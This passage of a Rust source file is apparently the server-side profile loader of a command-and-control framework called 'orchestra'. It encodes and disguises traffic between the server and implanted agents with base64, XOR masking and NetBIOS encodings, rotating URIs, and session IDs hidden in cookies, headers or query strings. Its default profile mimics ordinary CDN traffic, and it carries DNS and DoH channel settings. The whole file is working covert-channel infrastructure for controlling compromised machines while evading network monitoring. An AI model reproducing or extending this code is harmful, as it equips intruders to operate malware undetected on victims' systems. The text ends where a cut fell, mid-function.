//! Server-side Malleable C2 Profile Loader & Transformer
//!
//! This module provides:
//! - Loading of malleable profiles from TOML files at server startup
//! - Thread-safe profile storage via `Arc<RwLock<MalleableProfile>>`
//! - Pre-compiled `TransactionTransformer` for each transaction type
//!
//! # Usage
//!
//! ```ignore
//! // At server startup:
//! let profile = ProfileManager::load_from_env()?;
//!
//! // In a request handler:
//! let transformer = profile.get_transformer("http_get")?;
//! let encoded = transformer.encode_client(payload);
//! ```

use anyhow::{anyhow, Context, Result};
use base64::engine::general_purpose::{STANDARD as B64, URL_SAFE_NO_PAD as B64URL};
use base64::Engine;
use rand::Rng;
use std::collections::HashMap;
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::{Duration, Instant, SystemTime};
use thiserror::Error;
use tokio::sync::RwLock;

// ── Re-export the common types ───────────────────────────────────────────────
// The server needs the same data structures as the agent. Rather than
// duplicating them, we define them locally here. In a future refactor,
// these should be moved to the `common` crate.

/// Payload transform encoding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TransformType {
    None,
    Base64,
    Base64Url,
    Mask,
    Netbios,
    NetbiosU,
}

/// How metadata or output is delivered within an HTTP transaction.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum DeliveryMethod {
    Cookie,
    UriAppend,
    Header,
    Body,
}

// ── Configuration structs ────────────────────────────────────────────────────

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct GlobalConfig {
    pub user_agent: String,
    pub jitter: u8,
    pub sleep_time: u64,
    #[serde(default = "default_dns_idle")]
    pub dns_idle: String,
    #[serde(default)]
    pub dns_sleep: u64,
}

fn default_dns_idle() -> String {
    "0.0.0.0".to_string()
}

impl Default for GlobalConfig {
    fn default() -> Self {
        Self {
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36".to_string(),
            jitter: 0,
            sleep_time: 60,
            dns_idle: "0.0.0.0".to_string(),
            dns_sleep: 0,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SslConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default)]
    pub cert_pin: String,
    #[serde(default)]
    pub ja3_fingerprint: String,
    #[serde(default)]
    pub sni: String,
}

fn default_true() -> bool {
    true
}

impl Default for SslConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            cert_pin: String::new(),
            ja3_fingerprint: String::new(),
            sni: String::new(),
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct HttpTransformConfig {
    #[serde(default)]
    pub prepend: String,
    #[serde(default)]
    pub append: String,
    #[serde(default = "default_transform")]
    pub transform: TransformType,
    #[serde(default)]
    pub mask_stride: u32,
}

fn default_transform() -> TransformType {
    TransformType::None
}

impl Default for HttpTransformConfig {
    fn default() -> Self {
        Self {
            prepend: String::new(),
            append: String::new(),
            transform: TransformType::None,
            mask_stride: 0,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct UriAppendConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_amp")]
    pub separator: String,
    #[serde(default = "default_key")]
    pub key: String,
}

fn default_amp() -> String {
    "&".to_string()
}

fn default_key() -> String {
    "id".to_string()
}

impl Default for UriAppendConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            separator: "&".to_string(),
            key: "id".to_string(),
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct MetadataConfig {
    #[serde(default = "default_cookie")]
    pub delivery: DeliveryMethod,
    #[serde(default = "default_session")]
    pub key: String,
    #[serde(default = "default_b64")]
    pub transform: TransformType,
}

fn default_cookie() -> DeliveryMethod {
    DeliveryMethod::Cookie
}

fn default_session() -> String {
    "session".to_string()
}

fn default_b64() -> TransformType {
    TransformType::Base64
}

impl Default for MetadataConfig {
    fn default() -> Self {
        Self {
            delivery: DeliveryMethod::Cookie,
            key: "session".to_string(),
            transform: TransformType::Base64,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct OutputConfig {
    #[serde(default = "default_body")]
    pub delivery: DeliveryMethod,
    #[serde(default = "default_b64")]
    pub transform: TransformType,
}

fn default_body() -> DeliveryMethod {
    DeliveryMethod::Body
}

impl Default for OutputConfig {
    fn default() -> Self {
        Self {
            delivery: DeliveryMethod::Body,
            transform: TransformType::Base64,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct HttpTransactionConfig {
    #[serde(default)]
    pub uri: Vec<String>,
    #[serde(default = "default_get")]
    pub verb: String,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    #[serde(default)]
    pub uri_append: Option<UriAppendConfig>,
    #[serde(default)]
    pub client: HttpTransformConfig,
    #[serde(default)]
    pub server: HttpTransformConfig,
    #[serde(default)]
    pub metadata: Option<MetadataConfig>,
    #[serde(default)]
    pub output: Option<OutputConfig>,
}

fn default_get() -> String {
    "GET".to_string()
}

impl HttpTransactionConfig {
    pub fn random_uri(&self) -> &str {
        if self.uri.is_empty() {
            "/"
        } else if self.uri.len() == 1 {
            &self.uri[0]
        } else {
            let idx = rand::thread_rng().gen_range(0..self.uri.len());
            &self.uri[idx]
        }
    }

    pub fn build_headers(&self, session_id: &str) -> HashMap<String, String> {
        self.headers
            .iter()
            .map(|(k, v)| {
                let val = v.replace("{SESSIONID}", session_id);
                (k.clone(), val)
            })
            .collect()
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
#[allow(non_snake_case)]
pub struct DnsConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default)]
    pub beacon: String,
    #[serde(default)]
    pub get_A: String,
    #[serde(default)]
    pub get_TXT: String,
    #[serde(default)]
    pub post: String,
    #[serde(default = "default_max_txt")]
    pub max_txt_size: u16,
    #[serde(default)]
    pub dns_suffix: String,
    /// Encoding mode for DNS subdomain data. One of "hex", "base32", "base64url".
    /// Defaults to "hex" for backward compatibility.
    #[serde(default = "default_dns_encoding")]
    pub encoding: String,
    #[serde(default)]
    pub headers: DnsHeadersConfig,
}

fn default_max_txt() -> u16 {
    252
}

fn default_dns_encoding() -> String {
    "hex".to_string()
}

impl Default for DnsConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            beacon: String::new(),
            get_A: "api.".to_string(),
            get_TXT: "search.".to_string(),
            post: "upload.".to_string(),
            max_txt_size: 252,
            dns_suffix: String::new(),
            encoding: default_dns_encoding(),
            headers: DnsHeadersConfig::default(),
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct DnsHeadersConfig {
    #[serde(default)]
    pub doh_server: String,
    #[serde(default = "default_doh_method")]
    pub doh_method: String,
}

fn default_doh_method() -> String {
    "POST".to_string()
}

impl Default for DnsHeadersConfig {
    fn default() -> Self {
        Self {
            doh_server: "https://dns.google/dns-query".to_string(),
            doh_method: "POST".to_string(),
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ProfileInfo {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub author: String,
    #[serde(default)]
    pub description: String,
}

impl Default for ProfileInfo {
    fn default() -> Self {
        Self {
            name: "default".to_string(),
            author: String::new(),
            description: String::new(),
        }
    }
}

// ── Top-level profile ────────────────────────────────────────────────────────

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct MalleableProfile {
    #[serde(default)]
    pub profile: ProfileInfo,
    #[serde(default)]
    pub global: GlobalConfig,
    #[serde(default)]
    pub ssl: SslConfig,
    #[serde(default)]
    pub http_get: Option<HttpTransactionConfig>,
    #[serde(default)]
    pub http_post: Option<HttpTransactionConfig>,
    #[serde(default)]
    pub dns: DnsConfig,
}

impl MalleableProfile {
    pub fn from_toml(toml_str: &str) -> Result<Self> {
        let raw: RawProfile = toml::from_str(toml_str)
            .context("failed to parse malleable profile TOML")?;
        let profile = raw.into_profile();
        profile.validate()?;
        Ok(profile)
    }

    pub fn from_file(path: &PathBuf) -> Result<Self> {
        let contents = std::fs::read_to_string(path)
            .with_context(|| format!("failed to read profile from {:?}", path))?;
        Self::from_toml(&contents)
    }

    pub fn validate(&self) -> Result<()> {
        if self.http_get.is_none() && self.http_post.is_none() {
            anyhow::bail!("at least one of http_get or http_post must be defined in the malleable profile");
        }
        if let Some(ref get) = self.http_get {
            if get.uri.is_empty() {
                anyhow::bail!("URI list is empty for http_get transaction");
            }
        }
        if let Some(ref post) = self.http_post {
            if post.uri.is_empty() {
                anyhow::bail!("URI list is empty for http_post transaction");
            }
        }
        if self.global.jitter > 100 {
            anyhow::bail!("jitter must be 0–100, got {}", self.global.jitter);
        }
        Ok(())
    }
}

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            profile: ProfileInfo {
                name: "generic_cdn".to_string(),
                author: "orchestra".to_string(),
                description: "Safe default profile mimicking generic HTTPS CDN traffic".to_string(),
            },
            global: GlobalConfig {
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36".to_string(),
                jitter: 15,
                sleep_time: 60,
                dns_idle: "0.0.0.0".to_string(),
                dns_sleep: 0,
            },
            ssl: SslConfig {
                enabled: true,
                cert_pin: String::new(),
                ja3_fingerprint: String::new(),
                sni: "cdn.example.com".to_string(),
            },
            http_get: Some(HttpTransactionConfig {
                uri: vec![
                    "/cdn/assets/".to_string(),
                    "/static/js/".to_string(),
                    "/api/v2/content/".to_string(),
                ],
                verb: "GET".to_string(),
                headers: {
                    let mut m = HashMap::new();
                    m.insert("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8".to_string());
                    m.insert("Accept-Language".to_string(), "en-US,en;q=0.5".to_string());
                    m.insert("Accept-Encoding".to_string(), "gzip, deflate, br".to_string());
                    m.insert("Connection".to_string(), "keep-alive".to_string());
                    m
                },
                uri_append: None,
                client: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
                server: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
                metadata: None,
                output: None,
            }),
            http_post: Some(HttpTransactionConfig {
                uri: vec![
                    "/api/v2/upload".to_string(),
                    "/cdn/ingest".to_string(),
                ],
                verb: "POST".to_string(),
                headers: {
                    let mut m = HashMap::new();
                    m.insert("Content-Type".to_string(), "application/json".to_string());
                    m.insert("Accept".to_string(), "*/*".to_string());
                    m
                },
                uri_append: None,
                client: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
                server: HttpTransformConfig {
                    prepend: String::new(),
                    append: String::new(),
                    transform: TransformType::Base64,
                    mask_stride: 0,
                },
                metadata: None,
                output: None,
            }),
            dns: DnsConfig::default(),
        }
    }
}

// ── Raw TOML intermediate ────────────────────────────────────────────────────

#[derive(Debug, serde::Deserialize)]
struct RawProfile {
    profile: RawProfileInner,
}

#[derive(Debug, serde::Deserialize)]
struct RawProfileInner {
    #[serde(default)]
    name: String,
    #[serde(default)]
    author: String,
    #[serde(default)]
    description: String,
    #[serde(default)]
    global: GlobalConfig,
    #[serde(default)]
    ssl: SslConfig,
    #[serde(default)]
    http_get: Option<HttpTransactionConfig>,
    #[serde(default)]
    http_post: Option<HttpTransactionConfig>,
    #[serde(default)]
    dns: DnsConfig,
}

impl RawProfile {
    fn into_profile(self) -> MalleableProfile {
        let inner = self.profile;
        MalleableProfile {
            profile: ProfileInfo {
                name: inner.name,
                author: inner.author,
                description: inner.description,
            },
            global: inner.global,
            ssl: inner.ssl,
            http_get: inner.http_get,
            http_post: inner.http_post,
            dns: inner.dns,
        }
    }
}

// ── Transform helpers ────────────────────────────────────────────────────────

fn transform_encode(t: TransformType, input: &[u8], mask_stride: u32) -> Vec<u8> {
    match t {
        TransformType::None => input.to_vec(),
        TransformType::Base64 => B64.encode(input).into_bytes(),
        TransformType::Base64Url => B64URL.encode(input).into_bytes(),
        TransformType::Mask => {
            let key = if mask_stride > 0 { mask_stride as u8 } else { 0x42 };
            input.iter().map(|b| b ^ key).collect()
        }
        TransformType::Netbios => netbios_encode(input, false),
        TransformType::NetbiosU => netbios_encode(input, true),
    }
}

fn transform_decode(t: TransformType, input: &[u8], mask_stride: u32) -> Result<Vec<u8>> {
    match t {
        TransformType::None => Ok(input.to_vec()),
        TransformType::Base64 => B64
            .decode(input)
            .map_err(|e| anyhow!("base64 decode: {}", e)),
        TransformType::Base64Url => B64URL
            .decode(input)
            .map_err(|e| anyhow!("base64url decode: {}", e)),
        TransformType::Mask => {
            let key = if mask_stride > 0 { mask_stride as u8 } else { 0x42 };
            Ok(input.iter().map(|b| b ^ key).collect())
        }
        TransformType::Netbios => netbios_decode(input, false),
        TransformType::NetbiosU => netbios_decode(input, true),
    }
}

fn netbios_encode(input: &[u8], uppercase: bool) -> Vec<u8> {
    let base = if uppercase { b'A' } else { b'a' };
    let mut out = Vec::with_capacity(input.len() * 2);
    for &byte in input {
        out.push(base + (byte >> 4));
        out.push(base + (byte & 0x0F));
    }
    out
}

fn netbios_decode(input: &[u8], uppercase: bool) -> Result<Vec<u8>> {
    if input.len() % 2 != 0 {
        anyhow::bail!("netbios input length must be even, got {}", input.len());
    }
    let base = if uppercase { b'A' } else { b'a' };
    let mut out = Vec::with_capacity(input.len() / 2);
    for chunk in input.chunks(2) {
        let high = chunk[0].wrapping_sub(base) & 0x0F;
        let low = chunk[1].wrapping_sub(base) & 0x0F;
        out.push((high << 4) | low);
    }
    Ok(out)
}

// ── TransactionTransformer ───────────────────────────────────────────────────

/// A pre-compiled transformer for a specific transaction type (http_get, http_post).
///
/// Created by the `ProfileManager` and used by C2 handlers to encode/decode
/// traffic according to the malleable profile.
#[derive(Debug, Clone)]
pub struct TransactionTransformer {
    /// The transaction configuration.
    pub config: HttpTransactionConfig,
    /// Metadata encoding configuration (extracted from config.metadata).
    metadata_config: MetadataConfig,
    /// Per-session state store (shared across transformers).
    session_store: Arc<RwLock<HashMap<String, SessionState>>>,
}

impl TransactionTransformer {
    /// Create a transformer from a transaction config (backward-compatible).
    pub fn new(config: HttpTransactionConfig) -> Self {
        let metadata_config = config.metadata.clone().unwrap_or_default();
        Self {
            config,
            metadata_config,
            session_store: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Create a transformer with an explicit session store.
    pub fn with_session_store(
        config: HttpTransactionConfig,
        session_store: Arc<RwLock<HashMap<String, SessionState>>>,
    ) -> Self {
        let metadata_config = config.metadata.clone().unwrap_or_default();
        Self {
            config,
            metadata_config,
            session_store,
        }
    }

    /// Encode data for the client → server direction.
    ///
    /// Applies: prepend + transform(payload) + append
    pub fn encode_client(&self, payload: &[u8]) -> Vec<u8> {
        let encoded = transform_encode(
            self.config.client.transform,
            payload,
            self.config.client.mask_stride,
        );
        let mut out = Vec::with_capacity(
            self.config.client.prepend.len() + encoded.len() + self.config.client.append.len(),
        );
        out.extend_from_slice(self.config.client.prepend.as_bytes());
        out.extend_from_slice(&encoded);
        out.extend_from_slice(self.config.client.append.as_bytes());
        out
    }

    /// Decode data from the client → server direction.
    ///
    /// Reverses: strip prepend, strip append, then decode transform.
    pub fn decode_client(&self, data: &[u8]) -> Result<Vec<u8>> {
        let rest = strip_prefix(data, self.config.client.prepend.as_bytes());
        let core = strip_suffix(rest, self.config.client.append.as_bytes());
        transform_decode(self.config.client.transform, core, self.config.client.mask_stride)
    }

    /// Encode data for the server → client direction.
    pub fn encode_server(&self, payload: &[u8]) -> Vec<u8> {
        let encoded = transform_encode(
            self.config.server.transform,
            payload,
            self.config.server.mask_stride,
        );
        let mut out = Vec::with_capacity(
            self.config.server.prepend.len() + encoded.len() + self.config.server.append.len(),
        );
        out.extend_from_slice(self.config.server.prepend.as_bytes());
        out.extend_from_slice(&encoded);
        out.extend_from_slice(self.config.server.append.as_bytes());
        out
    }

    /// Decode data from the server → client direction.
    pub fn decode_server(&self, data: &[u8]) -> Result<Vec<u8>> {
        let rest = strip_prefix(data, self.config.server.prepend.as_bytes());
        let core = strip_suffix(rest, self.config.server.append.as_bytes());
        transform_decode(self.config.server.transform, core, self.config.server.mask_stride)
    }

    /// Get a random URI for this transaction.
    pub fn random_uri(&self) -> &str {
        self.config.random_uri()
    }

    /// Build headers with session ID substitution.
    pub fn build_headers(&self, session_id: &str) -> HashMap<String, String> {
        self.config.build_headers(session_id)
    }

    /// Get the HTTP verb.
    pub fn verb(&self) -> &str {
        &self.config.verb
    }

    // ── Malleable Pipeline Methods ────────────────────────────────────────

    /// Apply the SERVER transform pipeline to data being sent TO the agent.
    ///
    /// This is the server's outbound direction (server → agent response).
    /// Applies: server.prepend + transform(data) + server.append
    pub fn transform_outbound(&self, data: &[u8], _session_id: &str) -> Vec<u8> {
        self.encode_server(data)
    }

    /// Strip the CLIENT prepend/append and reverse the transform on data
    /// received FROM the agent.
    ///
    /// Returns a `TransformError` on failure for fine-grained error handling.
    pub fn transform_inbound(&self, raw: &[u8]) -> std::result::Result<Vec<u8>, TransformError> {
        let rest = strip_prefix_checked(raw, self.config.client.prepend.as_bytes())
            .ok_or(TransformError::PrependMismatch {
                expected: self.config.client.prepend.len(),
            })?;
        let core = strip_suffix_checked(rest, self.config.client.append.as_bytes())
            .ok_or(TransformError::AppendMismatch {
                expected: self.config.client.append.len(),
            })?;
        transform_decode(self.config.client.transform, core, self.config.client.mask_stride)
            .map_err(|e| TransformError::DecodeFailed(e.to_string()))
    }

    /// Encode the session identifier using the metadata config.
    ///
    /// The session ID is transformed according to the metadata transform
    /// setting (base64, base64url, mask, netbios, etc.) and returned as a
    /// string ready to be placed in the configured delivery method.
    pub fn encode_metadata(&self, session_id: &str) -> String {
        let bytes = session_id.as_bytes();
        let encoded: Vec<u8> = match self.metadata_config.transform {
            TransformType::None => bytes.to_vec(),
            TransformType::Base64 => B64.encode(bytes).into_bytes(),
            TransformType::Base64Url => B64URL.encode(bytes).into_bytes(),
            TransformType::Mask => {
                let key = 0x42u8;
                bytes.iter().map(|b| b ^ key).collect()
            }
            TransformType::Netbios => netbios_encode(bytes, false),
            TransformType::NetbiosU => netbios_encode(bytes, true),
        };
        String::from_utf8_lossy(&encoded).to_string()
    }

    /// Decode metadata that was encoded with `encode_metadata`.
    pub fn decode_metadata(&self, encoded: &str) -> std::result::Result<String, TransformError> {
        let bytes = encoded.as_bytes();
        let decoded = match self.metadata_config.transform {
            TransformType::None => bytes.to_vec(),
            TransformType::Base64 => B64.decode(bytes).map_err(|e| {
                TransformError::MetadataExtraction(format!("base64 decode: {}", e))
            })?,
            TransformType::Base64Url => B64URL.decode(bytes).map_err(|e| {
                TransformError::MetadataExtraction(format!("base64url decode: {}", e))
            })?,
            TransformType::Mask => {
                let key = 0x42u8;
                bytes.iter().map(|b| b ^ key).collect()
            }
            TransformType::Netbios => netbios_decode(bytes, false)
                .map_err(|e| TransformError::MetadataExtraction(e.to_string()))?,
            TransformType::NetbiosU => netbios_decode(bytes, true)
                .map_err(|e| TransformError::MetadataExtraction(e.to_string()))?,
        };
        String::from_utf8(decoded)
            .map_err(|e| TransformError::MetadataExtraction(format!("utf8: {}", e)))
    }

    /// Extract metadata from an HTTP request based on the delivery method.
    ///
    /// Looks for the session identifier in cookies, headers, URI parameters,
    /// or the request body prefix, depending on the metadata config.
    pub fn extract_metadata_from_headers(
        &self,
        headers: &HashMap<String, String>,
        uri: &str,
        body_prefix: &[u8],
    ) -> std::result::Result<String, TransformError> {
        match self.metadata_config.delivery {
            DeliveryMethod::Cookie => {
                // Look for a Cookie header and extract the key.
                let cookie_hdr = headers
                    .get("cookie")
                    .or_else(|| headers.get("Cookie"))
                    .ok_or_else(|| {
                        TransformError::MetadataExtraction("no Cookie header".to_string())
                    })?;
                let key = &self.metadata_config.key;
                for pair in cookie_hdr.split(';') {
                    let pair = pair.trim();
                    if let Some(val) = pair.strip_prefix(&format!("{}=", key)) {
                        return self.decode_metadata(val.trim());
                    }
                }
                Err(TransformError::MetadataExtraction(format!(
                    "cookie key '{}' not found",
                    key
                )))
            }
            DeliveryMethod::Header => {
                let key = &self.metadata_config.key;
                headers
                    .get(key)
                    .or_else(|| headers.get(&key.to_lowercase()))
                    .ok_or_else(|| {
                        TransformError::MetadataExtraction(format!(
                            "header '{}' not found",
                            key
                        ))
                    })
                    .and_then(|v| self.decode_metadata(v.trim()))
            }
            DeliveryMethod::UriAppend => {
                // Extract from URI query string: ?key=value or &key=value
                let key = &self.metadata_config.key;
                let query_part = if let Some(q) = uri.split('?').nth(1) {
                    q
                } else {
                    return Err(TransformError::MetadataExtraction(
                        "no query string in URI".to_string(),
                    ));
                };
                for pair in query_part.split('&') {
                    if let Some(val) = pair.strip_prefix(&format!("{}=", key)) {
                        return self.decode_metadata(val);
                    }
                }
                Err(TransformError::MetadataExtraction(format!(
                    "uri param '{}' not found",
                    key
                )))
            }
            DeliveryMethod::Body => {
                // The metadata is encoded as a prefix of the body.
                // We assume a fixed-length prefix based on a heuristic:
                // the encoded session ID is approximately 22 chars for base64(16 bytes).
                // In practice, the caller should know the session ID format.
                if body_prefix.is_empty() {
                    return Err(TransformError::MetadataExtraction(
                        "body is empty".to_string(),
                    ));
                }
                // Try to find a reasonable delimiter (newline or null).
                let end = body_prefix
                    .iter()
                    .position(|&b| b == b'\n' || b == b'\0')
                    .unwrap_or(body_prefix.len().min(64));
                let meta_str = String::from_utf8_lossy(&body_prefix[..end]);
                self.decode_metadata(&meta_str)
            }
        }
    }

    /// Register a new session in the session store.
    pub async fn register_session(
        &self,
        session_id: String,
        profile: &MalleableProfile,
        profile_name: &str,
    ) {
        let state = SessionState::new(session_id, profile, profile_name);
        let mut store = self.session_store.write().await;
        store.insert(state.session_id.clone(), state);
    }

    /// Get a session from the store.
    pub async fn get_session(
        &self,
        session_id: &str,
    ) -> Option<tokio::sync::RwLockReadGuard<'_, HashMap<String, SessionState>>> {
        // This is a bit awkward — we return the whole store guard.
        // The caller can then index into it.
        let guard = self.session_store.read().await;
        if guard.contains_key(session_id) {
            Some(guard)
        } else {
            None
        }
    }

    /// Check if a URI matches any of the configured URIs for this transaction.
    pub fn matches_uri(&self, request_uri: &str) -> bool {
        // Strip query string for matching.
        let path = request_uri.split('?').next().unwrap_or(request_uri);
        self.config.uri.iter().any(|u| {
            // Exact match or prefix match (URI may have additional path segments).
            path == u || path.starts_with(u)
        })
    }

    /// Get the content type from the profile headers, if configured.
    pub fn content_type(&self) -> Option<&str> {
        self.config
            .headers
            .get("Content-Type")
            .map(|s| s.as_str())
    }

    /// Get a reference to the metadata config.
    pub fn metadata_config(&self) -> &MetadataConfig {
        &self.metadata_config
    }

    /// Get a reference to the session store.
    pub fn session_store(&self) -> &Arc<RwLock<HashMap<String, SessionState>>> {
        &self.session_store
    }
}

fn strip_prefix<'a>(data: &'a [u8], prefix: &[u8]) -> &'a [u8] {
    if !prefix.is_empty() && data.len() >= prefix.len() && &data[..prefix.len()] == prefix {
        &data[prefix.len()..]
    } else {
        data
    }
}

fn strip_suffix<'a>(data: &'a [u8], suffix: &[u8]) -> &'a [u8] {
    if !suffix.is_empty() && data.len() >= suffix.len() && &data[data.len() - suffix.len()..] == suffix {
        &data[..data.len() - suffix.len()]
    } else {
        data
    }
}

/// Like `strip_prefix` but returns `None` on mismatch instead of the original data.
fn strip_prefix_checked<'a>(data: &'a [u8], prefix: &[u8]) -> Option<&'a [u8]> {
    if prefix.is_empty() {
        return Some(data);
    }
    if data.len() >= prefix.len() && &data[..prefix.len()] == prefix {
        Some(&data[prefix.len()..])
    } else {
        None
    }
}

/// Like `strip_suffix` but returns `None` on mismatch instead of the original data.
fn strip_suffix_checked<'a>(data: &'a [u8], suffix: &[u8]) -> Option<&'a [u8]> {
    if suffix.is_empty() {
        return Some(data);
    }
    if data.len() >= suffix.len() && &data[data.len() - suffix.len()..] == suffix {
        Some(&data[..data.len() - suffix.len()])
    } else {
        None
    }
}

// ── Transform Error ──────────────────────────────────────────────────────────

/// Error type for transform pipeline operations.
#[derive(Debug, Error)]
pub enum TransformError {
    #[error("prepend mismatch: expected {expected:?} bytes, data too short or not found")]
    PrependMismatch { expected: usize },
    #[error("append mismatch: expected {expected:?} bytes, data too short or not found")]
    AppendMismatch { expected: usize },
    #[error("transform decode failed: {0}")]
    DecodeFailed(String),
    #[error("metadata extraction failed: {0}")]
    MetadataExtraction(String),
    #[error("session not found: {0}")]
    SessionNotFound(String),
    #[error("validation failed: {0}")]
    ValidationFailed(String),
}

// ── Per-Session State ────────────────────────────────────────────────────────

/// Tracks per-session state for the malleable transform pipeline.
///
/// Each agent session gets its own `SessionState` which is created when
/// the agent first checks in. The state includes:
/// - URI rotation index (independent from the agent's rotation)
/// - Session key material for the encryption layer
/// - Last-seen timestamp for session liveness tracking
/// - A snapshot of the profile at session creation time, so existing
///   sessions are not disrupted by profile hot-reloads.
#[derive(Debug)]
pub struct SessionState {
    /// Unique session identifier.
    pub session_id: String,
    /// Current URI rotation index for this session.
    pub uri_index: AtomicUsize,
    /// Session key for the encryption layer (forward secrecy).
    pub session_key: Vec<u8>,
    /// Timestamp of the last received message.
    pub last_seen: Instant,
    /// Snapshot of the profile at session creation time.
    /// Existing sessions continue using this snapshot even after
    /// a profile hot-reload to avoid breaking active connections.
    pub profile_snapshot: MalleableProfile,
    /// Name of the profile used for this session.
    pub profile_name: String,
}

impl SessionState {
    /// Create a new session state with the given profile snapshot.
    pub fn new(session_id: String, profile: &MalleableProfile, profile_name: &str) -> Self {
        // Generate a random 32-byte session key.
        let mut key = vec![0u8; 32];
        rand::thread_rng().fill(&mut key[..]);
        Self {
            session_id,
            uri_index: AtomicUsize::new(0),
            session_key: key,
            last_seen: Instant::now(),
            profile_snapshot: profile.clone(),
            profile_name: profile_name.to_string(),
        }
    }

    /// Update the last-seen timestamp to now.
    pub fn touch(&self) {
        // NOTE: We can't mutate Instant through &self, so we use a pattern
        // where callers update via the session store's write lock.
    }

    /// Get the next URI for the given transaction type and advance the index.
    pub fn next_uri(&self, transaction_type: &str) -> Option<String> {
        let config = match transaction_type {
            "http_get" => self.profile_snapshot.http_get.as_ref(),
            "http_post" => self.profile_snapshot.http_post.as_ref(),
            _ => return None,
        };
        let config = config?;
        if config.uri.is_empty() {
            return None;
        }
        let idx = self.uri_index.fetch_add(1, Ordering::Relaxed);
        Some(config.uri[idx % config.uri.len()].clone())
    }
}

// ── ProfileManager ───────────────────────────────────────────────────────────

/// Manages the loaded malleable profile and provides thread-safe access.
///
/// The profile is loaded once at server startup and stored in an `Arc<RwLock>`
/// so all handlers can read it concurrently. The profile can be hot-reloaded
/// via `reload()`.
#[derive(Debug, Clone)]
pub struct ProfileManager {
    profile: Arc<RwLock<MalleableProfile>>,
    path: Option<PathBuf>,
}

impl ProfileManager {
    /// Create a new profile manager with the given profile.
    pub fn new(profile: MalleableProfile) -> Self {
        Self {
            profile: Arc::new(RwLock::new(profile)),
            path: None,
        }
    }

    /// Load a malleable profile from the environment.
    ///
    /// Checks in order:
    /// 1. `ORCHESTRA_PROFILE` environment variable (path to TOML file)
    /// 2. `./profile.toml` in the current working directory
    /// 3. Falls back to the default profile
    pub async fn load_from_env() -> Result<Self> {
        if let Ok(path_str) = std::env::var("ORCHESTRA_PROFILE") {
            let path = PathBuf::from(&path_str);
            if path.exists() {
                tracing::info!(
                    "loading malleable profile from ORCHESTRA_PROFILE={}",
                    path_str
                );
                let profile = MalleableProfile::from_file(&path)?;
                return Ok(Self {
                    profile: Arc::new(RwLock::new(profile)),
                    path: Some(path),
                });
            } else {
                tracing::warn!(
                    "ORCHESTRA_PROFILE={} does not exist, falling back to default",
                    path_str
                );
            }
        }

        // Try ./profile.toml
        let local = PathBuf::from("profile.toml");
        if local.exists() {
            tracing::info!("loading malleable profile from ./profile.toml");
            let profile = MalleableProfile::from_file(&local)?;
            return Ok(Self {
                profile: Arc::new(RwLock::new(profile)),
                path: Some(local),
            });
        }

        tracing::info!("no malleable profile found, using default");
        Ok(Self {
            profile: Arc::new(RwLock::new(MalleableProfile::default())),
            path: None,
        })
    }

    /// Load a malleable profile from a specific file path.
    pub fn load_from_file(path: PathBuf) -> Result<Self> {
        let profile = MalleableProfile::from_file(&path)?;
        Ok(Self {
            profile: Arc::new(RwLock::new(profile)),
            path: Some(path),
        })
    }

    /// Get a read guard on the current profile.
    pub async fn profile(&self) -> tokio::sync::RwLockReadGuard<'_, MalleableProfile> {
        self.profile.read().await
    }

    /// Get a pre-compiled transformer for the given transaction type.
    ///
    /// Valid transaction types: `"http_get"`, `"http_post"`.
    pub async fn get_transformer(&self, transaction_type: &str) -> Result<TransactionTransformer> {
        let guard = self.profile.read().await;
        match transaction_type {
            "http_get" => guard
                .http_get
                .as_ref()
                .map(|c| TransactionTransformer::new(c.clone()))
                .ok_or_else(|| anyhow!("http_get transaction not configured in profile")),
            "http_post" => guard
                .http_post
                .as_ref()
                .map(|c| TransactionTransformer::new(c.clone()))
                .ok_or_else(|| anyhow!("http_post transaction not configured in profile")),
            other => Err(anyhow!("unknown transaction type: {}", other)),
        }
    }

    /// Hot-reload the profile from the original path.
    pub async fn reload(&self) -> Result<()> {
        if let Some(ref path) = self.path {
            let new_profile = MalleableProfile::from_file(path)?;
            let mut guard = self.profile.write().await;
            *guard = new_profile;
